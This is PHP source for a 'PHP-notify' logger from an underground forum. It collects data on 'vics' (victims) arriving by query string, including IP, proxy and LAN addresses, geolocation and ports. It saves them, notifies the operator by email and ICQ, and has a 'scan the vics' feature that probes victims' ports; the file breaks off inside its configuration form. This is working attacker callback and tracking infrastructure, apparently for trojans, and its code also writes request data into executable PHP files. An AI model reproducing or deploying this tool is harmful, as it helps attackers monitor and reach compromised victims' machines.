<?php
##########################################################################################################
# This script is for educationnal purpose only															 #
# php log by roger girardin																				 #
#                                     																	 #
#                     special thanks to antidote007 my friend and beta tester                            #
#                     special thanks to neonapster bastar and maxi300 for beta tests					 #
#                     special thanks to karate kid slipk and aStReal1   								 #
#                                     																	 #
# and to all team from : 
#                                     																	 #
# http://undergroundkonnekt.cjb.net/  (high level anti security forum - highly forbidden to lamers)      #
#                                     																	 #
#                                     																	 #
# it looks for visitor datas																			 #
# it analyses the query string																			 #
# then it saves the datas into a php file															     #
# you can choose encryption mode and keep compatiility with the uncrypted logs				             #
# if defined $email ==> it will send you a mail notification											 #
# if defined $icq ==> it will send you an icq notification												 #
# it will send a notification in case of forcing the access with wrong pass                              #	
# you can define a limit numer to your visitor list then it will delete the older vics passing the limit #
# you can define a limit date (days)to your visitor list then it will delete the visitor passing the date#
# you can define to eliminate duplicate visitor then it will delete the visitor passing the date	   	 #
# you can define to delete off line visitor (need a good host)        	                                 #
# the password is encrypted now (slipk request)      	                                                 #
#                                                   	                                                 #
# as this script is not made for lamer user, if you are a lamer, you are forbidden to use it             #
#																							    		 #
#		      any comment : roger.girardin@caramail.com	                                                 # 
#                                     																	 #
##########################################################################################################
$top_margin=0;
$left_margin=0;
$array_fields=array(0=>"N°","Date","Crypt","Ip adress","Lan/proxy","City","State","Country","Status","Del");

include("config.inc.php");
##########################################################################################################
#                                     																	 #
#  										  Php data searcher begin      									 #
#                                     																	 #
##########################################################################################################
error_reporting(0);
#---------------------------------------------------------------------------------------------------------
IF(!isset($op) && !empty($HTTP_SERVER_VARS['QUERY_STRING']))
   {
# var declaration
###############################################################
$array_verif=array(0=>"NAME:","CITY:","STATE:","COUNTRY:","DOMAIN_GUESS:");
$web_vic_ip="";
$local_vic_ip="";
$data_body="";

for($i=0;$i<count($array_verif);$i++)
    {
	$array_verif2[$i]=strtolower(str_replace(":","=",$array_verif[$i]));	
	}
$patterns=array("/\"/","/;/","/\\$/");
$delim=array("/}/","/{/","/\*/");

$vic_info="<"."?"."\n";
$vic_info.="$"."crypted"."=\"".$crypter."\";"."\n";
$mail_body="============================================="."\n".date("d - m - Y  H:i")."\n"."============================================="."\n"."PHP TRACER RESULT"."\n"."=============================================";

$web_vic_ip=$HTTP_SERVER_VARS['REMOTE_ADDR'];	 
$local_vic_ip=$HTTP_SERVER_VARS['HTTP_X_FORWARDED_FOR'];
###############################################################
# data extraction
###############################################################
# if the vic is on lan or behind a proxy

if($web_vic_ip != $local_vic_ip && $local_vic_ip <> "")
   {
   if(@verif_ip($local_vic_ip))
               {
			   $vic_info.="$"."proxy_adress"."=\"".encrypt_log($web_vic_ip,$key_crypt,$crypter)."\";"."\n";
			   $vic_info.="$"."lan_vic_adress"."=\"".encrypt_log($local_vic_ip,$key_crypt,$crypter)."\";"."\n";
			   
			   $mail_body.="\n"."----------------- vic on lan -----------------"."\n";
			   $mail_body.="\n"."Proxy adress : ".$web_vic_ip;
			   $mail_body.="\n"."Lan vic adress : ".$local_vic_ip;
			   }else{
					$vic_info.="$"."proxy_adress"."=\"".encrypt_log($web_vic_ip,$key_crypt,$crypter)."\";"."\n";
					$vic_info.="$"."net_vic_adress"."=\"".encrypt_log($local_vic_ip,$key_crypt,$crypter)."\";"."\n";
					
					$mail_body.="\n"."----------------- vic isp on proxy -----------------"."\n";
					$mail_body.="\n"."Proxy adress : ".$web_vic_ip;
					$mail_body.="\n"."Net vic adress : ".$local_vic_ip;
					}
   }
   else
       {
	   $vic_info.="$"."net_vic_adress"."=\"".encrypt_log($web_vic_ip,$key_crypt,$crypter)."\";"."\n";
	   
	   $mail_body.="\n"."----------------- vic on line -----------------"."\n";
	   $mail_body.="\n"."Net vic adress : ".$web_vic_ip."\n";
	   }
###############################################################
$host=(@gethostbyname($web_vic_ip));  # vic host

if(@eregi("([a-z])",$host))
   {
   $vic_info.="$"."translation_vic_ip"."=\"".encrypt_log($host,$key_crypt,$crypter)."\";"."\n";
   
   $mail_body.="\n".format("translation vic ip : $host");
   }
###############################################################
if($datas = file("http://netgeo.caida.org/perl/netgeo.cgi?target=".$web_vic_ip))
   {
   for($j=0;$j<=count($datas);$j++)
       {
	   $result[$j]=@verif_result($datas[$j],$array_verif);
	   }
###############################################################
$od=0;

   for($j=0;$j<=count($result);$j++)
       {
	   preg_match("/[\$][\w]+[=]/i",$result[$j],$match);
	   
	   if(!empty($match[0]))
	      {
		  $var_name[$od]=$match[0];
		  $val_var[$od]=str_replace($var_name[$od],"",$result[$j]);
		  
		  $vic_info.="$".substr($var_name[$od],1)."\"";
		  $vic_info.=encrypt_log(substr(trim($val_var[$od]),1,-2),$key_crypt,$crypter)."\";"."\n";

		  $od++;
		  }
	   }
###############################################################
   $test=array();
   
   for($j=0;$j<=count($result);$j++)
       {
	   $test[$j]=trim($result[$j]);
	   if(!empty($test[$j]))
	      {
	      for($i=0;$i<count($array_verif2);$i++)
	          {
		      if(stristr($result[$j],$array_verif2[$i]))
		         {
			     $mail_body.="\r".str_replace("="," = ",preg_replace($patterns,"",$result[$j]));
			     }
		      }
		  }
	   }
   }
$mail_body.="============================================="."\n"."SERVER DATAS"."\n"."=============================================";
##########################################################################################################
#                                     																	 #
#  									 Php query string searcher begin   									 #
#                                     																	 #
##########################################################################################################
$array_var=get_query_string($HTTP_SERVER_VARS['REQUEST_METHOD']);

$i=0;
$vic_info_var_name="$"."vic_var_name"."="."array"."(";
$vic_info_var="$"."vic_var"."="."array"."(";
$data_body2="";
$data_body3="";


	while (list($key,$val)=each($array_var))
	       {
		   if(!is_array($val))
		      {
			  $vic_info_var_name.=$i."=>\"".$key."\"".",";
		      $vic_info_var.=$i."=>\"".encrypt_log(preg_replace($delim,"",$val),$key_crypt,$crypter)."\"".",";
			  
			  $mail_body.="\n".format("$key : ".preg_replace($delim,"",$val));
			  $data_body.="[".formatt($key,preg_replace($delim,"",$val),$replace)."]";
			  $data_body2.="\r".formatt($key,preg_replace($delim,"",$val),$replace);
			  $data_body3.=formatt($key,preg_replace($delim,"",$val),$replace);
			  }
		   $i++;
		   }
		   $vic_info_var_name=substr($vic_info_var_name,0,-1);
		   $vic_info_var=substr($vic_info_var,0,-1);
		   
$mail_body.="\n"."=============================================";

$vic_info_var_name.=");\n";
$vic_info_var.=");\n";
###############################################################
# all the datas are encapsuled in $vic_info

$vic_info.=$vic_info_var_name.$vic_info_var;
$vic_info.="\n"."?".">";
###############################################################
# save the datas to a file

verif_vic_dir($vic_folder);
     $newfile = fopen("./".$vic_folder."/".time().".php","w+");
     fwrite($newfile,$vic_info);
     fclose($newfile);
###############################################################
# mail preparation

for($i=0;$i<count($email);$i++)
    {
	if(!empty($email[$i]))
	   {
	   if(verif_email($email[$i]))
	      {
		  mail($email[$i],$vic_mail_subject,"\n".$mail_body,"From: $email[$i]");
		  }
	   }
	}
###############################################################
# icq preparation

if(empty($icq_mail)){$icq_mail="vic@vic_land.org";}

for($i=0;$i<count($icq);$i++)
    {
	if(!empty($icq[$i]) && is_numeric($icq[$i]))
	   {
	   $data=array("to"=>$icq[$i],"from"=>"icq notifier","fromemail"=>$icq_mail,"body"=>$data_body2,"subject"=>$vic_mail_subject);
	   
	   $post[$i]=new socksender();
	   $post[$i]->send($icq_host,$icq_path,$icq_referer_url."?Uin=$icq[$i]",$data);
	   }
	}
   exit();
}
##########################################################################################################
#                                     																	 #
#  									 Php logger script end          									 #
#                                     																	 #
##########################################################################################################

##########################################################################################################
# logger index
##########################################################################################################
IF(!isset($op) && empty($HTTP_SERVER_VARS['QUERY_STRING']))
   {
   if($HTTP_SERVER_VARS['QUERY_STRING']=="")
      {
      $title="PHP-notify [enter password]";
      $input="Please enter password :";

   		  print "<HTML><HEAD><TITLE>".$title."</Title></HEAD>
          <BODY BGCOLOR=\"$figure_[0]\" top margin=\"$top_margin\"  left_margin=\"$left_margin\">
		     <center><FORM ACTION=\"$PHP_SELF\" method=\"post\">
                <table width=\"40%\" cellpadding=\"1\" cellspacing=\"0\" border=\"1\" bgcolor=\"$figure_[1]\" bordercolor =\"000000\"><br><br><br>
				   <tr bgcolor=\"$figure_[3]\">
				      <td align=\"center\">
					  <font color=\"$figure2_[3]\" size=\"2\" face=\"sans-serif, Arial, Helvetica\"><b>".$input."</b></font>
					  </td>
				   </tr>
                   <tr bgcolor=\"$figure_[4]\">
				      <td align=\"center\">
                       <INPUT TYPE=\"password\" NAME=\"pass\" SIZE=\"30%\">
                       <INPUT TYPE=\"hidden\" NAME=\"op\" VALUE=\"1\">
                       <INPUT TYPE=\"submit\" VALUE=\"OK\">
					   </td>
					</tr>
                </table>
		     </FORM></CENTER>
          </BODY></HTML>";
		  exit();	
      }
	  exit();
   }
##########################################################################################################
# logger password tester 
##########################################################################################################
if($_SERVER['REQUEST_METHOD']=="GET")
   {
   $op=$_GET['op'];
   $pass=$_GET['pass'];
   }
   elseif($_SERVER['REQUEST_METHOD']=="POST")
          {
		  $op=$_POST['op'];
          $pass=$_POST['pass'];
		  }
		 // print_r($_SERVER);
##########################################################################################################
IF($op==1 || $op==8)
   {
   if(encrypt_log(trim($pass),$key_crypt,1)!=trim($pwd))
      {

	  $msg="some attacker tried to force your log page "."\r";
	  $msg.="script name : ".$PHP_SELF."\r";
	  $msg.=" attacker ip adress : ".str_replace(".",$replace,$HTTP_SERVER_VARS['REMOTE_ADDR']);

	  FOR($i=0;$i<count($email);$i++)
	      {
		  $msg_mail=$msg."script location : ".$HTTP_SERVER_VARS['HTTP_HOST']."\n";

		  if(!empty($email[$i]))
		     {
	         if(verif_email($email[$i]))
	            {
		        mail($email[$i],"log attack","\n".$msg_mail,"From: $email[$i]");
		        }
	         }
		  }
		  
	  if(empty($icq_mail)){$icq_mail="vic@vic_land.org";}
		  
	  for($i=0;$i<count($icq);$i++)
          {
	       $data=array("to"=>$icq[$i],"from"=>"icq notifier","fromemail"=>$icq_mail,"body"=>$msg,"subject"=>$vic_mail_subject);
	   
	       $post[$i]=new socksender();
	       $post[$i]->send($icq_host,$icq_path,$icq_referer_url."?Uin=$icq[$i]",$data);
	      }		  
		  		  
          # invalid password
		  $title="PHP-notify [invalid password]";
		  $input="Invalid password, try again :";
		  
		  print "<HTML><HEAD><TITLE>".$title."</Title></HEAD>
          <BODY BGCOLOR=\"$figure_[0]\" top margin=\"$top_margin\"  left_margin=\"$left_margin\">
		     <center><FORM ACTION=\"$PHP_SELF\" method=\"post\">
                <table width=\"40%\" cellpadding=\"1\" cellspacing=\"0\" border=\"1\" bgcolor=\"$figure_[1]\" bordercolor =\"000000\"><br><br><br>
				   <tr bgcolor=\"$figure_[3]\">
				      <td align=\"center\">
					  <font color=\"$figure2_[3]\" size=\"2\" face=\"sans-serif, Arial, Helvetica\"><b>".$input."</b></font>
					  </td>
				   </tr>
                   <tr bgcolor=\"$figure_[4]\">
				      <td align=\"center\">
                       <INPUT TYPE=\"password\" NAME=\"pass\" SIZE=\"30%\">
                       <INPUT TYPE=\"hidden\" NAME=\"op\" VALUE=\"1\">
                       <INPUT TYPE=\"submit\" VALUE=\"OK\">
					   </td>
					</tr>
                </table>
		     </FORM></CENTER>
          </BODY></HTML>";
		  exit();		  
		  }	
		  else
		      {
			  ##############################   max vic listing   ##############################
			  if(is_numeric($max_vic_list))
			     {
				 delete_exedent_vic($max_vic_list,$vic_folder);
				 }
			  ##############################     max vic time     ##############################
			  if(is_numeric($max_vic_time))
			     {
				 delete_old_vic($vic_folder,$max_vic_time);
			     }
			  ##############################   delete duplicate  ##############################
			  if($delete_duplicate==1)
				 {
				 delete_duplicate($vic_folder,$key_crypt);
				 }
			  ##############################   delete vic off line  ##############################
			  if($vic_off_line==1)
				 {
				 delete_off_line($vic_folder,$key_crypt);
				 }
			  ###################################################################################
			  #  vic listing
			  $count_vic_list=count(scan_dir($vic_folder));
			  
			  $today=today();
	
			  $title="PHP-notify [vic listing]";
	  
	  print "<HTML>
	  <HEAD>
	     <TITLE>".$title."</Title>
		    <SCRIPT language=JavaScript>
            <!--
	        function PopupCentrer(page,largeur,hauteur,options) {
            var top=(screen.height-hauteur)/2;
            var left=(screen.width-largeur)-10;
            window.open(page,\"\",\"top=\"+top+\",left=\"+left+\",width=\"+largeur+\",height=\"+hauteur+\",\"+options);
            }
	        -->
            </SCRIPT>
            <style type=text/css><!--BODY {SCROLLBAR-FACE-COLOR:#006699; SCROLLBAR-HIGHLIGHT-COLOR:#000000; SCROLLBAR-SHADOW-COLOR: #000000; SCROLLBAR-ARROW-COLOR: #CCCCCC; SCROLLBAR-TRACK-COLOR: #CCCCCC; }  --></style>
	  </HEAD>
		 <center>
          <BODY BGCOLOR=\"$figure_[0]\" top margin=\"$top_margin\"  left_margin=\"$left_margin\">
		    <table cellpadding=\"1\" cellspacing=\"1\" border=\"0\" width=\"700\">
			   <form action=\"$PHP_SELF\" method=\"POST\" target=\"_self\">
			   <tr bgcolor=\"white\"><td width=\"100%\" Colspan=\"10\"></td></tr>
			   <tr bgcolor=\"$figure_[1]\">
			      <td Colspan=\"10\" height=\"30\">
				      <table cellpadding=\"0\" cellspacing=\"0\" border=\"0\" width=\"100%\">
				         <tr bgcolor=\"$figure_[1]\">
						    <td height=\"30\">
				               <font face=\"MS Sans Serif\" size=\"2\" color=\"$figure2_[1]\">Php logger [listing]</font>
			                </td>
				            <td height=\"30\" align=\"right\">
				               <font face=\"MS Sans Serif\" size=\"2\" color=\"$figure2_[1]\">&nbsp;".$count_vic_list." &nbsp; vics</font>
			                </td>
			             </tr>
						<tr bgcolor=\"white\"><td width=\"100%\" Colspan=\"2\"></td></tr>
				      </table>
			      </td>
			   </tr>";
			    $vic_list=scan_dir($vic_folder);
					 if(is_array($vic_list))
			            {
			            rsort($vic_list);
						
						echo("\r"."<tr bgcolor=\"$figure_[2]\">"."\r");
						
						for($i=0;$i<count($array_fields);$i++)
						    {
							echo("<td align=\"center\">"."\r"."
							         <font face=\"MS Sans Serif\" size=\"2\" color=\"$figure2_[2]\">".$array_fields[$i]."</font></td>"."\r");
							}
						
			   	       print"

			           </tr>
			           <tr><td width=\"100%\" Colspan=\"10\"></td></tr>
			           <tr bgcolor=\"white\"><td width=\"100%\" Colspan=\"10\"></td></tr>
			           <tr><td width=\"100%\" Colspan=\"10\"></td></tr>";

 	                    for($i=0;$i<count($vic_list);$i++)
					        {
					        $date=date("d-m-Y H:i",substr(trim($vic_list[$i]),0,-4));
					 
					        $crypted=0;
					 
					 include("./".$vic_folder."/".trim($vic_list[$i]));
					 
					 	   if(is_int($i/2)){$exa=$figure_[4];$pol=$figure2_[4];}else{$exa=$figure_[3];$pol=$figure2_[3];}

					 echo("
					 <tr bgcolor=\"$exa\">
					    <td align=\"right\"><font face=\"MS Sans Serif\" size=\"1\" color=\"$pol\">".($i+1)."</td>
					    <td align=\"center\">
						   <a href='javascript:PopupCentrer(\"".$PHP_SELF."?op=3&link=".$vic_list[$i]."&pass=$pass\",400,400,\" menubar=no,scrollbars=yes,statusbar=no,resizable=yes\")'>
    						<font face=\"MS Sans Serif\" size=\"1\" color=\"$pol\">$date</a></td>
						<td align=\"center\"><font face=\"MS Sans Serif\" size=\"1\" color=\"$pol\">");	
						is_crypted($crypted);
						echo("</td>");	
						
						if(!empty($proxy_adress) && !empty($lan_vic_adress))
						   {
						   $ip_to_scan=decrypt_log($proxy_adress,$key_crypt,$crypted);
						   echo("<td align=\"center\"><font face=\"MS Sans Serif\" size=\"1\" color=\"$pol\">".decrypt_log($proxy_adress,$key_crypt,$crypted)."</font></td>
						         <td align=\"center\"><font face=\"MS Sans Serif\" size=\"1\" color=\"$pol\">".decrypt_log($lan_vic_adress,$key_crypt,$crypted)."</font></td>");
						   }
						   elseif(!empty($proxy_adress) && !empty($net_vic_adress))
						          {
								  $ip_to_scan=decrypt_log($proxy_adress,$key_crypt,$crypted);
								  echo("<td align=\"center\"><font face=\"MS Sans Serif\" size=\"1\" color=\"$pol\">".decrypt_log($proxy_adress,$key_crypt,$crypted)."</font></td>
								        <td align=\"center\"><font face=\"MS Sans Serif\" size=\"1\" color=\"$pol\">".decrypt_log($net_vic_adress,$key_crypt,$crypted)."</font></td>");
								  }
								  else
								      {
									  $ip_to_scan=decrypt_log($net_vic_adress,$key_crypt,$crypted);
									  echo("<td align=\"center\"><font face=\"MS Sans Serif\" size=\"1\" color=\"$pol\">".decrypt_log($net_vic_adress,$key_crypt,$crypted)."</font></td>
									        <td align=\"center\"><font face=\"MS Sans Serif\" size=\"1\" color=\"$pol\">none</font></td>");
									  }
					    echo(" <td><font face=\"MS Sans Serif\" size=\"1\" color=\"$pol\">".format(decrypt_log($city,$key_crypt,$crypted))."</font></td>
							   <td><font face=\"MS Sans Serif\" size=\"1\" color=\"$pol\">".format(decrypt_log($state,$key_crypt,$crypted))."</font></td>
							   <td><font face=\"MS Sans Serif\" size=\"1\" color=\"$pol\">".format(decrypt_log($country,$key_crypt,$crypted))."</font></td>");
							   
							   $port_to_scan=search_port($vic_var_name,$vic_var,$key_crypt,$crypted);

							   if($op==8)
							      {
								  if(ping_host2($ip_to_scan,$port_to_scan))
							         {
					                  echo("<td align=\"center\" bgcolor=\"black\"><font face=\"MS Sans Serif\" size=\"1\" color=\"white\">on</font>
								      </td>");
								     }
									 else
								         {
									     echo("<td align=\"center\"><font face=\"MS Sans Serif\" size=\"1\" color=\"$pol\">off</td>");
									     }
								  }
								  else
								      {
									  echo("<td align=\"center\">
						                <a href='javascript:PopupCentrer(\"".$PHP_SELF."?op=7&pass=$pass&ip=$ip_to_scan&port=$port_to_scan&link=".$vic_list[$i]."\",400,400,\" menubar=no,scrollbars=yes,statusbar=no,resizable=yes\")'>
										<font face=\"MS Sans Serif\" size=\"1\" color=\"$pol\">scan</font></a></td>");
									  }
						echo(" 
						    <td><input type=\"checkbox\" name=\"chek[$i]\" value=\"".$vic_list[$i]."\"></td>
					        </tr>  ");
		   }
					   echo(" 
							<tr><td width=\"100%\" Colspan=\"10\"></td></tr>
			                <tr bgcolor=\"white\"><td width=\"100%\" Colspan=\"10\"></td></tr>
			                <tr><td width=\"100%\" Colspan=\"10\"></td></tr>
			                <tr bgcolor=\"$figure_[5]\">
			                   <td width=\"100%\" Colspan=\"10\">
							      <table cellpadding=\"0\" cellspacing=\"0\" border=\"0\" width=\"100%\">
								     <tr bgcolor=\"$figure_[5]\">
									    <td width=\"200\">
										<input type=\"submit\" name=\"delete\" value=\"Delete\" style=\"width:200\"></td>
									    <td width=\"300\">
							            <input type=\"submit\" name=\"delete\" value=\"Delete_all\" style=\"width:250\">
							            </td>
						                <td align=\"center\" width=\"250\">");
										if($op==8)
										   {
										   echo("
										   <A HREF=\"javascript:window.history.back()\"><font face=\"MS Sans Serif\" size=\"1\" color=\"$figure2_[5]\">[ back ]</font></a>");
										   }
										   else
										       {
											   echo("
											   <a href=\"$PHP_SELF?op=8&pass=$pass\" target=\"_self\"><font face=\"MS Sans Serif\" size=\"1\" color=\"$figure2_[5]\">[ scan the vics ]</font></a>");
											   }
					   echo(" </td>
									 </tr>	
								     <tr bgcolor=\"$figure_[5]\"><td width=\"100%\" Colspan=\"10\"></td></tr>
			                         <tr bgcolor=\"$figure_[5]\">
									    <td width=\"200\">
							            <input type=\"submit\" name=\"delete\" value=\"Delete the log before\" style=\"width:200\"></td>
			                            </td>
							            <td width=\"250\">");
						             select_menu($today["d"],1,31,"d_today","45");
						             select_menu($today["m"],1,12,"m_today","45");
						             select_menu($today["y"],2000,2005,"y_today","70");
						             select_menu($today["h"],0,23,"h_today","45");
						             select_menu($today["i"],0,59,"i_today","45");
						             print("</td>
						             <td align=\"center\" width=\"250\">
						             <a href=\"$PHP_SELF?op=9\" target=\"_blank\"><font face=\"MS Sans Serif\" size=\"1\" color=\"$figure2_[5]\">[ php_info() ]</font></a>
						             </td>
				                  </tr>
							   </table>
							</td>							
			             </tr>");
						 }
					  echo("
			             <tr bgcolor=\"white\"><td width=\"100%\" Colspan=\"10\"></td></tr>
					     <tr bgcolor=\"$figure_[5]\">
							<td width=\"200\" colspan=\"10\">
							<input type=\"hidden\" name=\"pass\" value=\"$pass\">
							<input type=\"hidden\" name=\"op\" value=\"2\">
							<input type=\"submit\" name=\"delete\" value=\"Change the config\" style=\"width:200\"></td>
			                </td>
						</tr>
					  
			             <tr bgcolor=\"white\"><td width=\"100%\" Colspan=\"10\"></td></tr>
						</form>
						</table>
						</body>
						</html>");	
      exit;
      
}

}
##########################################################################################################
# Advanced vic datas
##########################################################################################################
IF($op==2 && encrypt_log($pass,$key_crypt,1)==$pwd)
   {
   
   $delete=$_POST['delete'];
   
   if($delete=="Delete")
      {
      $chek_keys=@array_keys($chek);

      for($i=0;$i<@count($chek_keys);$i++)
          {
	   
	      if(is_file("./".$vic_folder."/".$chek[$chek_keys[$i]]))
	         {
             @unlink("./".$vic_folder."/".$chek[$chek_keys[$i]]);
		     }
	      }
      redirect($PHP_SELF."?op=1&pass=$pass");
	  }
   elseif($delete=="Delete_all")
          {
		  delete_file($vic_folder);
		  redirect($PHP_SELF."?op=1&pass=$pass");
		  }
   elseif($delete=="Delete the log before")
          {
		  $stamp=mktime($h_today,$i_today,00,$m_today,$d_today,$y_today);
		  
          if($dir=@opendir($vic_folder))
	         {
	         while($file=@readdir($dir))
                   {
			       if($file[strlen($file)-1]!=".")
                      {
                      if(is_file($vic_folder."/".$file))
				         {
						 $parse_file=explode(".",$file);
						 if($parse_file[0]<$stamp)
						    {
							unlink($vic_folder."/".$file);
							}
					     }  
				     }
                  }
	         }
          redirect($PHP_SELF."?op=1&pass=$pass");
		  }
   elseif($delete=="Change the config")
          {
		  
####################################################################################################
# 																								   #
#                                        install form                                              #
# 																								   #
####################################################################################################
echo("
<HTML>
	  <HEAD>
	     <TITLE>CGI LOG [ INSTALL ]</Title>
            <style type=text/css><!--BODY {SCROLLBAR-FACE-COLOR:#006699; SCROLLBAR-HIGHLIGHT-COLOR:#000000; SCROLLBAR-SHADOW-COLOR: #000000; SCROLLBAR-ARROW-COLOR: #CCCCCC; SCROLLBAR-TRACK-COLOR: #CCCCCC; }  --></style>
	  </HEAD>
		 <center>
          <BODY BGCOLOR=\"$figure_[0]\" top margin=\"$top_margin\"  left_margin=\"$left_margin\">
             <table border=\"0\" cellpadding=\"0\" cellspacing=\"1\" width=\"700\">
             <form ENCTYPE=\"multipart/form-data\" method=\"POST\" action=\"$PHP_SELF?op=1\">
                <tr bgcolor=\"white\">
				   <td width=\"87\"></td>
				   <td width=\"87\"></td>
				   <td width=\"87\"></td>
				   <td width=\"87\"></td>
				   <td width=\"87\"></td>
				   <td width=\"87\"></td>
				   <td width=\"87\"></td>
				   <td width=\"87\"></td>
				</tr>
	            <tr bgcolor=\"$figure_[1]\">
                   <td align=\"center\" colspan=\"8\" height=\"30\"><font face=\"MS Sans Serif\" size=\"2\" color=\"$figure2_[1]\">you can modificate your default config</font></td>
                </tr>  
                <tr bgcolor=\"white\"><td width=\"5\" colspan=\"8\"></td></tr>
				<tr bgcolor=\"$figure_[2]\">
			      <td align=\"center\" colspan=\"4\">
				     <font face=\"MS Sans Serif\" size=\"2\" color=\"$figure2_[2]\">&nbsp;Email to notify</font>
			      </td>
				  <td align=\"center\" colspan=\"4\">
				     <font face=\"MS Sans Serif\" size=\"2\" color=\"$figure2_[2]\">&nbsp;Icq to notify</font>
			      </td>
                </tr> 
                <tr bgcolor=\"white\"><td width=\"5\" colspan=\"8\"></td></tr>");
#-------------------------------------------------------------------------------------------------------
  for($i=0;$i<5;$i++)
      {
	  if(is_int($i/2)){$exa=$figure_[4];$pol=$figure2_[4];}else{$exa=$figure_[3];$pol=$figure2_[3];}
#------------------------------------------------------------------------------------------
	  $num=$i+1;
	  echo("<tr bgcolor=\"$exa\">
	           <td><font face=\"MS Sans Serif\" size=\"1\" color=\"$pol\">&nbsp;mail to notif $num</td>
			   <td align=\"right\" colspan=\"3\"><input type=\"text\" style=\"width:100%\" name=\"_email[$i]\"value=\"");
	           if(!empty($email[$i])){echo($email[$i]);}
	  echo("\"></td>
			   <td><font face=\"MS Sans Serif\" size=\"1\" color=\"$pol\">&nbsp;icq to notif $num</td>
			   <td align=\"right\" colspan=\"3\"><input type=\"text\" style=\"width:100%\" name=\"_icq[$i]\" value=\"");
	           if(!empty($icq[$i])){echo($icq[$i]);}
	  echo("\"></td>
		  </tr>");
	  }
#-------------------------------------------------------------------------------------------------------
echo("  
                <tr bgcolor=\"white\"><td colspan=\"8\"></td></tr>
                <tr bgcolor=\"$figure_[2]\">
				   <td colspan=\"8\"><font face=\"MS Sans Serif\" size=\"1\" color=\"$figure2_[2]\">&nbsp;Icq Notification Figures</td>
				</tr>
				<tr bgcolor=\"$figure_[3]\">
				   <td><font face=\"MS Sans Serif\" size=\"1\" color=\"$figure2_[3]\">&nbsp;referer url</td>
			       <td align=\"right\" colspan=\"7\"><input type=\"text\" style=\"width:100%\" name=\"_icq_referer_url\" value=\"http://".str_replace("http://","",$icq_referer_url)."\"></td>
				</tr>
				<tr bgcolor=\"$figure_[4]\">
				   <td><font face=\"MS Sans Serif\" size=\"1\" color=\"$figure2_[4]\">&nbsp;send url</td>
			       <td align=\"right\" colspan=\"7\"><input type=\"text\" style=\"width:100%\" name=\"_icq_send_url\" value=\"http://".str_replace("http://","",$icq_host.$icq_path)."\"></td>
				</tr>
				<tr bgcolor=\"white\"><td colspan=\"8\"></td></tr>
                <tr bgcolor=\"$figure_[2]\">
				   <td colspan=\"8\"><font face=\"MS Sans Serif\" size=\"1\" color=\"$figure2_[2]\">&nbsp;Notification figures</td>
				</tr>
                <tr bgcolor=\"white\"><td colspan=\"8\"></td></tr>
				<tr bgcolor=\"$figure_[3]\">
				   <td width=\"87\"><font face=\"MS Sans Serif\" size=\"1\" color=\"$figure2_[3]\">&nbsp;mail subject</font></td>
			       <td align=\"right\" colspan=\"3\"><input type=\"text\" style=\"width:100%; text-align: center\" name=\"_vic_mail_subject\" value=\"$vic_mail_subject\"></td>
				   <td width=\"87\"><font face=\"MS Sans Serif\" size=\"1\" color=\"$figure2_[3]\">&nbsp;your icq mail</font></td>
			       <td align=\"right\" colspan=\"3\"><input type=\"text\" style=\"width:100%; text-align: center\" name=\"_icq_mail\" value=\"$icq_mail\"></td>
		        </tr>
				<tr bgcolor=\"white\"><td colspan=\"8\"></td></tr>
                <tr bgcolor=\"$figure_[2]\">
				   <td colspan=\"8\"><font face=\"MS Sans Serif\" size=\"1\" color=\"$figure2_[2]\">&nbsp;Vic list admin</td>
				</tr>
                <tr bgcolor=\"white\"><td colspan=\"8\"></td></tr>
				<tr bgcolor=\"$figure_[3]\">
				   <td width=\"87\"><font face=\"MS Sans Serif\" size=\"1\" color=\"$figure2_[3]\">&nbsp;max vic list</font></td>
			       <td ><select style=\"width:100%; text-align: center\" name=\"_max_vic_list\">
				        <option>disabled</option>");
				   test_select_step(5,5,100,$max_vic_list);
echo(" 				   
				   </select>
				   </td>
				   <td><font face=\"MS Sans Serif\" size=\"1\" color=\"$figure2_[3]\">&nbsp;max vic time</font></td>
			       <td><select style=\"width:100%; text-align: center\" name=\"_max_vic_time\">
				     <option selected>disabled</option>");
				   test_select_step(1,1,60,$max_vic_time);
echo("
				   <td><font face=\"MS Sans Serif\" size=\"1\" color=\"$figure2_[3]\">&nbsp;delete duplicate vic</font></td>
			       <td><select style=\"width:100%; text-align: center\" name=\"_delete_duplicate\">");
				   test_select($delete_duplicate,1);
echo("				  
					   </select>		
                   </td>
				    <td width=\"100\"><font face=\"MS Sans Serif\" size=\"1\" color=\"$figure2_[3]\">&nbsp;delete off line vic</font></td>
			       <td ><select style=\"width:100%; text-align: center\" name=\"_vic_off_line\">");
				   test_select($vic_off_line,1);
echo("				  				   
						</select>		
				   </td>
				<tr bgcolor=\"white\"><td colspan=\"8\"></td></tr>
                <tr bgcolor=\"$figure_[2]\">
				   <td colspan=\"8\"><font face=\"MS Sans Serif\" size=\"1\" color=\"$figure2_[2]\">&nbsp;Miscellanous figures</td>
				</tr>
                <tr bgcolor=\"white\"><td colspan=\"8\"></td></tr>
				<tr bgcolor=\"$figure_[3]\">
				   <td width=\"87\"><font face=\"MS Sans Serif\" size=\"1\" color=\"$figure2_[3]\">&nbsp;script name</font></td>
			       <td align=\"right\" colspan=\"3\"><input type=\"text\" style=\"width:100%; text-align: center\" name=\"_script_name\" value=\"".basename($PHP_SELF)."\"></td>
				   <td width=\"87\"><font face=\"MS Sans Serif\" size=\"1\" color=\"$figure2_[3]\">&nbsp;vic_folder</font></td>
				   <td align=\"right\"><input type=\"text\" style=\"width:100%; text-align: center\" name=\"_vic_folder\" value=\"$vic_folder\"></td>	
                   <td><font face=\"MS Sans Serif\" size=\"1\" color=\"$figure2_[3]\">&nbsp;ip delim replace</font></td>                   
				   <td><select style=\"width:100%; text-align: center; font-weight: bold\" name=\"_replace\">");

				   for($i=0;$i<count($array_replace);$i++)
				       {
					   if(is_int($i/2)){$exa=$figure_[4];$pol=$figure2_[4];}else{$exa=$figure_[3];$pol=$figure2_[3];}

					   echo("<option style=\"background-color: $exa; font-weight: bold; color: $pol\">".$array_replace[$i]."</option>");
					   }
echo(" 
                       </select>	
				   </td>				   
				</tr>
				<tr bgcolor=\"white\"><td colspan=\"8\"></td></tr>
                <tr bgcolor=\"$figure_[2]\">
				   <td colspan=\"8\"><font face=\"MS Sans Serif\" size=\"1\" color=\"$figure2_[2]\">&nbsp;Security figures</td>
				</tr>
                <tr bgcolor=\"white\"><td width=\"5\" colspan=\"8\"></td></tr>
				<tr bgcolor=\"$figure_[3]\">
				   <td width=\"87\"><font face=\"MS Sans Serif\" size=\"1\" color=\"$figure2_[3]\">&nbsp;your password</font></td>
